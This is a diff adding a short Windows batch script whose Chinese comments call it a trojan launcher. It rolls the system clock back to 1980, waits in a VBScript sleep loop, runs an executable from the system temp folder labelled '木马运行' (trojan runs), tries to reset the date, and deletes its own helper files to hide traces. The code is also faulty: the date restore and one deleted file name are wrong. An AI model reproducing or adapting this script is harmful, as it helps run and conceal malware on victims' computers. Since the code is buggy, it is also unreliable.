@@ -1,0 +1,23 @@
+set date=%date%
+                          改时间    
+date 1980-01-01
+
+@echo off & setlocal enableextensions
+echo WScript.Sleep 1000 > %temp%.\tmp$$$.vbs
+set /a i = 10
+:Timeout
+if %i% == 0 goto Next             
+setlocal
+set /a i = %i% - 1                                延迟运行
+cscript //nologo %temp%.\tmp$$$.vbs   
+goto Timeout
+goto End
+
+:Next
+%systemroot%\temp\1.exe
+set date=%date%
+date %date%                          木马运行
+
+del tem$$$.vbs
+del 1.vbs               
+del 1.bat                     删除文件
